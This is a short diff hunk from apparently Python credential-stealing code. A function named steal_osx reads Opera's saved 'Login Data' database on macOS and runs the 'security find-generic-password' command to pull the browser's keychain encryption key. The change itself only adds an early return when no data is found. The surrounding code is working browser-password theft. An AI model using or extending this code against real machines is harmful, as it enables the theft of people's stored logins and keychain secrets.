@@ -39,6 +39,9 @@ def steal_osx():
     recovered = list()
     # Get the passwords
     data = query_db(os.path.expanduser('~/Library/Application Support/com.operasoftware.Opera/Login Data'))
+    # Are there any passwords?
+    if not isinstance(data,list):
+        return data
     # Get the encrpytion key from the keychain
     safe_storage_key = subprocess.Popen("security find-generic-password -wa 'Opera'",stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
     stdout, stderr = safe_storage_key.communicate()
